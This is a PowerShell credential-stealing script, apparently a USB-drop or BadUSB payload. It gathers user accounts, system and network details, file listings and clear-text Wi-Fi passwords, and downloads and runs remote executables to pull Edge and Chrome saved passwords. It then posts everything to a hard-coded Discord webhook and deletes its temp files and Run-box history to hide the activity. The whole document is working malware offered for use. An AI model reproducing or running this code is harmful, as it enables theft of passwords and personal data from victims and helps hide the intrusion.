#This will grab computer info and WiFi/Browser passwords and send them to a webhook

$D="$env:tmp";
cd $D\pass

$FileName = "${Date}${env:computername}_${Time}.txt";



$Date = Get-Date -Format yyyy-MM-dd;
$Time = Get-Date -Format hh-mm-ss;
dir env:;
$env:computername | Out-File $FileName -Force;
Add-Content -Path “$FileName” -Value “Computer Info";
Get-LocalUser | Where-Object -Property PasswordRequired -Match false | Out-File $FileName -Append;
Get-LocalUser | Out-File $FileName -Append;


Get-CimInstance -ClassName Win32_ComputerSystem | Out-File $FileName -Append;
Get-LocalUser | Where-Object -Property PasswordRequired -Match false | Out-File $FileName -Append;
Get-LocalUser | Out-File $FileName -Append;

Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' | Out-File $FileName -Append;
Get-ChildItem -Path $userDir -Include *.txt, *.doc, *.docx, *.pptx, *.xlsx, *.pdf, *.jpg, *.png, *.mp3, *.mp4, *.zip, *.rar -Recurse | Out-File $FileName -Append;



$networks = (netsh wlan show profiles) | Select-String 'All User Profile\s+:\s(.+)'
foreach ($network in $networks) {
    $name = $network.Matches.Groups[1].Value.Trim()
    $password = (netsh wlan show profile name="$name" key=clear) | Select-String 'Key Content\s+:\s(.+)' | ForEach-Object {
        $_.Matches.Groups[1].Value.Trim()
    }
    [PSCustomObject]@{
        PROFILE_NAME = $name
        PASSWORD = $password
    } | Out-File $FileName -Append;
};


Add-Content -Path “$FileName” -Value “Edge Passwords”; 
     
    $edgeUrl = 'https://github.com/luciferseamus/Browser_exe/raw/main/edge/edge.exe';
    $EdgePath = '.\edge.exe';
    if (-not (Test-Path -Path $EdgePath)) {Invoke-WebRequest -Uri $edgeUrl -OutFile $edgePath;}
$EdgeOutput = & $edgePath | Out-File $FileName -Append;
    

Add-Content -Path “$FileName” -Value “Chrome Passwords”;


    $chromeUrl = 'https://github.com/luciferseamus/Browser_exe/raw/main/chrome/chrome.exe';
    $chromePath = '.\chrome.exe';
    if (-not (Test-Path -Path $chromePath)) {Invoke-WebRequest -Uri $chromeUrl -OutFile $chromePath;}
$chromeOutput = & $chromePath | Out-File $FileName -Append;
   



$args1 = Get-Content .\$FileName;

$statOutput = $args1 | Out-String;
    $webhookUrl = 'https://discord.com/api/webhooks/1256048768206241803/BWYs2QrnsKznXQ9dSCCX4FJVvQvHKn9KpcvXFHJoKL5iWCRW_FWMravdB-8qJfslVn_n';
    $chunks = [Math]::Ceiling($statOutput.Length / 2000);for ($i = 0; $i -lt $chunks; $i++) {$start = $i * 2000;$length = [Math]::Min(2000, $statOutput.Length - $start);$content = $statOutput.Substring($start, $length); 
    $webhookContent = @{'username' = 'V1Ru7EnT';'content' = $content;};  
    $jsonData = ConvertTo-Json -InputObject $webhookContent;IWR -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json';Start-Sleep -Seconds 1;};

########################################################################################################################################################################

cd\
# empty temp folder
rm $D\Pass* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f